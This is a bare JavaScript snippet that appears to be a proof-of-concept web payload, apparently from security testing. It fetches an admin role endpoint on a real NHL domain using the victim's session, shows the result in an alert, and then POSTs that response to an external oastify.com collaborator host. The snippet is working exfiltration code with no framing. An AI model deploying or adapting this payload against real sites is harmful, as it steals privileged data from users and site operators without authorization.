var req = new XMLHttpRequest();
req.open('GET', 'https://link.nhl.com/iami/admin/rest/role?', false) 
req.send();
alert(req.responseText)

var test = req.responseText

var req1 = new XMLHttpRequest();
req1.open('POST', 'https://srnz93binwceaer10iutivta3190xp.oastify.com', false) 
req1.send(test);
